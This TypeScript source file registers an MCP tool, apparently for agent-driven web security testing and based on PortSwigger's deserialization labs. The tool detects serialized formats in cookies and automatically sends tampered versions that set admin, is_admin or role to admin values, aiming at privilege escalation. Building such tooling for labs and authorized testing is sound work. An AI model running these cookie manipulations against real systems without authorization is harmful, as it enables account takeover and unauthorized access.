/**
 * Deserialization testing tools.
 *
 * Detects and manipulates serialized objects in cookies and parameters.
 * Based on PortSwigger Insecure Deserialization labs.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, requireTool } from "../runner.js";

export function register(server: McpServer): void {
  server.tool(
    "deserialization_test",
    "Detect and manipulate serialized objects in cookies. Analyzes cookie values for serialization patterns (PHP serialize, Java, .NET ViewState, base64-encoded JSON). If a serialized format is detected, attempts privilege escalation by modifying fields (admin=1, role=admin). Returns: {detection: {format, decoded, fields}, manipulation_results: [...]}. Side effects: Sends requests with modified cookies. May escalate privileges if successful.",
    {
      url: z
        .string()
        .describe("Target URL to test, e.g. https://target/my-account"),
      cookie_name: z
        .string()
        .describe(
          "Cookie name that may contain serialized data, e.g. 'session', 'user', 'data'"
        ),
      cookie_value: z
        .string()
        .optional()
        .describe(
          "Current cookie value to analyze. If not provided, fetches from the target URL"
        ),
      auth_cookie: z
        .string()
        .optional()
        .describe(
          "Additional auth cookies to send, e.g. 'session=abc123'"
        ),
    },
    async ({ url, cookie_name, cookie_value: cookieValueParam, auth_cookie }) => {
      requireTool("curl");

      let cookieValue = cookieValueParam ?? null;

      // Fetch the cookie if not provided
      if (!cookieValue) {
        const fetchArgs: string[] = ["-sk", "-D", "-", "-o", "/dev/null"];
        if (auth_cookie) {
          fetchArgs.push("-b", auth_cookie);
        }
        fetchArgs.push(url);

        const fetchRes = await runCmd("curl", fetchArgs);
        const headers = fetchRes.stdout;

        // Extract the cookie from Set-Cookie headers
        for (const line of headers.split("\n")) {
          if (line.toLowerCase().startsWith("set-cookie:")) {
            const cookiePart = line
              .slice(line.indexOf(":") + 1)
              .trim()
              .split(";")[0];
            if (cookiePart.startsWith(`${cookie_name}=`)) {
              cookieValue = cookiePart.slice(`${cookie_name}=`.length);
              break;
            }
          }
        }
      }

      if (!cookieValue) {
        const result = {
          error: `Could not find cookie '${cookie_name}'. Provide it manually via cookie_value parameter.`,
        };
        return {
          content: [{ type: "text", text: JSON.stringify(result, null, 2) }],
        };
      }

      // Step 1: Detect serialization format
      let detectedFormat = "unknown";
      let decodedValue = "";
      let fields: Record<string, unknown> = {};

      // Try base64 decode first
      let rawValue = cookieValue;
      let wasBase64 = false;
      try {
        const decodedBytes = Buffer.from(cookieValue, "base64");
        const decoded = decodedBytes.toString("utf-8");
        // Only use if it decodes to something non-binary
        if (decoded && decoded.length > 0) {
          decodedValue = decoded;
          rawValue = decoded;
          wasBase64 = true;
        }
      } catch {
        decodedValue = cookieValue;
      }

      // PHP serialize pattern: O:8:"ClassName":N:{...} or a:N:{...} or s:N:"..."
      const phpObjPattern = /[Oas]:\d+[:{]/;
      if (phpObjPattern.test(rawValue)) {
        detectedFormat = "php_serialize";
        // Extract field values: s:N:"field_name";TYPE:VALUE patterns
        const fieldPattern =
          /s:\d+:"([^"]+)";(?:s:\d+:"([^"]+)"|i:(\d+)|b:([01]))/g;
        let match: RegExpExecArray | null;
        while ((match = fieldPattern.exec(rawValue)) !== null) {
          const fieldName = match[1];
          if (match[2] !== undefined && match[2] !== "") {
            fields[fieldName] = match[2];
          } else if (match[3] !== undefined && match[3] !== "") {
            fields[fieldName] = parseInt(match[3], 10);
          } else if (match[4] !== undefined && match[4] !== "") {
            fields[fieldName] = Boolean(parseInt(match[4], 10));
          }
        }
      } else if (
        cookieValue.startsWith("rO0AB") ||
        (decodedValue && decodedValue.slice(0, 2) === "\xac\xed")
      ) {
        // Java serialized: starts with 0xaced0005 (base64: rO0AB)
        detectedFormat = "java_serialize";
      } else if (cookieValue.startsWith("/wE")) {
        // .NET ViewState: starts with /wE
        detectedFormat = "dotnet_viewstate";
      } else if (
        rawValue.trim().startsWith("{") ||
        rawValue.trim().startsWith("[")
      ) {
        // JSON (plain or base64-encoded)
        detectedFormat = "json";
        try {
          fields = JSON.parse(rawValue);
        } catch {
          // leave fields empty
        }
      } else if (cookieValue.split(".").length === 3) {
        // JWT-like (three base64 segments separated by dots)
        detectedFormat = "jwt_like";
        const parts = cookieValue.split(".");
        try {
          let payload = parts[1];
          // Add padding
          payload += "=".repeat((4 - (payload.length % 4)) % 4);
          const decodedPayload = Buffer.from(payload, "base64").toString("utf-8");
          fields = JSON.parse(decodedPayload);
        } catch {
          // leave fields empty
        }
      }

      // Step 2: Attempt manipulation based on detected format
      const manipulationResults: Array<Record<string, unknown>> = [];

      if (detectedFormat === "php_serialize") {
        // Try common privilege escalation modifications
        const manipulations: [string, (v: string) => string][] = [
          [
            "admin_true",
            (v) => v.replace(/(s:\d+:"admin";)b:0/, "$1b:1"),
          ],
          [
            "admin_int_1",
            (v) => v.replace(/(s:\d+:"admin";)i:0/, "$1i:1"),
          ],
          [
            "role_admin",
            (v) =>
              v.replace(
                /(s:\d+:"role";s:)\d+(:"[^"]*")/,
                '$15:"admin"'
              ),
          ],
          [
            "is_admin_true",
            (v) => v.replace(/(s:\d+:"is_admin";)b:0/, "$1b:1"),
          ],
        ];

        for (const [manipName, manipFn] of manipulations) {
          const modified = manipFn(rawValue);
          if (modified === rawValue) {
            manipulationResults.push({
              manipulation: manipName,
              skipped: true,
              reason: "Pattern not found in cookie",
            });
            continue;
          }

          // Base64-encode if original was base64
          let modifiedCookie: string;
          if (wasBase64) {
            modifiedCookie = Buffer.from(modified, "utf-8").toString("base64");
          } else {
            modifiedCookie = modified;
          }

          // Send the manipulated cookie
          let fullCookie = `${cookie_name}=${modifiedCookie}`;
          if (auth_cookie) {
            fullCookie = `${auth_cookie}; ${fullCookie}`;
          }

          const res = await runCmd("curl", [
            "-sk",
            "-o",
            "-",
            "-w",
            "\n__META__%{http_code}:%{size_download}",
            "-b",
            fullCookie,
            url,
          ]);

          let body = res.stdout;
          const metaMarker = body.lastIndexOf("__META__");
          let status = 0;
          let length = 0;
          if (metaMarker !== -1) {
            const meta = body.slice(metaMarker + 8).trim();
            const parts = meta.split(":");
            status = parts.length > 0 ? parseInt(parts[0], 10) || 0 : 0;
            length = parts.length > 1 ? parseInt(parts[1], 10) || 0 : 0;
            body = body.slice(0, metaMarker);
          }

          manipulationResults.push({
            manipulation: manipName,
            modified_value:
              modifiedCookie.length > 100
                ? modifiedCookie.slice(0, 100) + "..."
                : modifiedCookie,
            status,
            length,
            response_snippet: body.slice(0, 500),
            skipped: false,
          });
        }
      } else if (detectedFormat === "json" && typeof fields === "object" && fields !== null && !Array.isArray(fields)) {
        // Try modifying common privilege fields
        const privFields: [string, unknown][] = [
          ["admin", true],
          ["admin", 1],
          ["admin", "true"],
          ["role", "admin"],
          ["role", 2],
          ["roleid", 2],
          ["is_admin", true],
          ["is_admin", 1],
          ["access_level", "admin"],
          ["privilege", "admin"],
        ];

        for (const [fieldName, fieldValue] of privFields) {
          const modifiedFields = { ...(fields as Record<string, unknown>), [fieldName]: fieldValue };
          const modifiedJson = JSON.stringify(modifiedFields);

          // Base64-encode if original was base64
          let modifiedCookie: string;
          if (wasBase64) {
            modifiedCookie = Buffer.from(modifiedJson, "utf-8").toString("base64");
          } else {
            modifiedCookie = modifiedJson;
          }

          let fullCookie = `${cookie_name}=${modifiedCookie}`;
          if (auth_cookie) {
            fullCookie = `${auth_cookie}; ${fullCookie}`;
          }

          const res = await runCmd("curl", [
            "-sk",
            "-o",
            "-",
            "-w",
            "\n__META__%{http_code}:%{size_download}",
            "-b",
            fullCookie,
            url,
          ]);

          let body = res.stdout;
          const metaMarker = body.lastIndexOf("__META__");
          let status = 0;
          let length = 0;
          if (metaMarker !== -1) {
            const meta = body.slice(metaMarker + 8).trim();
            const partsM = meta.split(":");
            status = partsM.length > 0 ? parseInt(partsM[0], 10) || 0 : 0;
            length = partsM.length > 1 ? parseInt(partsM[1], 10) || 0 : 0;
            body = body.slice(0, metaMarker);
          }

          manipulationResults.push({
            manipulation: `${fieldName}=${fieldValue}`,
            modified_value:
              modifiedCookie.length > 100
                ? modifiedCookie.slice(0, 100) + "..."
                : modifiedCookie,
            status,
            length,
            response_snippet: body.slice(0, 500),
            skipped: false,
          });
        }
      }

      const result = {
        cookie_name,
        original_value:
          cookieValue.length > 100
            ? cookieValue.slice(0, 100) + "..."
            : cookieValue,
        detection: {
          format: detectedFormat,
          decoded_preview: decodedValue ? decodedValue.slice(0, 500) : "",
          fields:
            typeof fields === "object" && fields !== null && !Array.isArray(fields)
              ? fields
              : {},
        },
        manipulation_results: manipulationResults,
        hint:
          detectedFormat !== "unknown"
            ? `Detected ${detectedFormat} serialization. ${manipulationResults.length} manipulation(s) attempted.`
            : "Serialization format not recognized. Manual analysis may be needed.",
      };

      return {
        content: [{ type: "text", text: JSON.stringify(result, null, 2) }],
      };
    }
  );
}
